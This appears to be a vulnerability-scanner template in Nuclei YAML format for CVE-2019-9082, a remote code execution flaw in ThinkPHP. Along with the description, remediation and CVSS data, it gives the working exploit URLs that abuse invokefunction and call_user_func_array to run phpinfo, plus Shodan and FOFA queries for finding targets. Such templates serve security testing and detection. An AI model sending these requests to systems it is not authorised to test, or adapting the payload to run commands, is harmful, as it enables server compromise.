id: CVE-2019-9082

info:
  name: ThinkPHP - Remote Code Execution
  author: elskow
  severity: critical
  description: |
    ThinkPHP before 3.2.4 allows remote command execution via crafted use of the
    invokefunction method to call system functions through URL parameters.
  impact: |
    Attackers can execute arbitrary system commands without authentication, leading to full server compromise.
  remediation: |
    Upgrade ThinkPHP to version 3.2.4 or later.
  reference:
    - https://github.com/xiayulei/open_source_bms/issues/33
    - https://nvd.nist.gov/vuln/detail/CVE-2019-9082
    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2019-9082
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
    vendor: thinkphp
    product: thinkphp
    shodan-query: cpe:"cpe:2.3:a:thinkphp:thinkphp"
    fofa-query: app="ThinkPHP"
  tags: cve,cve2019,thinkphp,rce,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
      - "{{BaseURL}}/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
        condition: and

      - type: status
        status:
          - 200
